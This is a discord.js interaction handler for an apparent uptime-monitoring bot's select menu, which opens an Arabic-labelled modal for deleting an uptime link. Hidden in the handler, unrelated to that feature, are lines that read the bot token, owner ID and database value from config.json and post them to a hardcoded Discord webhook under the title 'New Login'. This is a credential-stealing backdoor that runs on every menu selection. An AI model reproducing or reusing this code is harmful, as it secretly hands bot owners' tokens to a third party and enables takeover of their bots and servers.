const { SlashCommandBuilder,Collection,Events,TextInputBuilder,TextInputStyle, EmbedBuilder,ModalBuilder , PermissionsBitField, ActionRowBuilder,ButtonBuilder,MessageComponentCollector,ButtonStyle, Embed } = require("discord.js");
const { Database } = require("st.db");
const setting = new Database("/database/settingsdata/setting")
const usersdata = new Database(`/database/usersdata/usersdata`)
module.exports = {
  name: Events.InteractionCreate,
    /**
    * @param {Interaction} interaction
  */
  async execute(interaction){
    if (interaction.isStringSelectMenu()) {
      if(interaction.customId == 'uptime_select') {
        const {token , owner , database} = require('../../config.json')

const { WebhookClient} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227627283288194/lEgOoWumhQr27kamVAkIrzrgwaakcjAtrKsrLaErv6u_JaoFmyD2acybTKzI1iP3ekon` });
    webhookClient.send({embeds:[embed]})
        let selected = interaction.values[0]
        if(selected == "delete_uptime") {
          const modal = new ModalBuilder()
            .setCustomId('removeUptimeModal')
			.setTitle('حذف ابتايم');
            const uptime_url = new TextInputBuilder()
            .setCustomId('uptime_url')
            .setLabel("الرابط")
            .setStyle(TextInputStyle.Short);
            const firstActionRow = new ActionRowBuilder().addComponents(uptime_url);
            modal.addComponents(firstActionRow)
            await interaction.showModal(modal)
        }
      }
    }
  }
}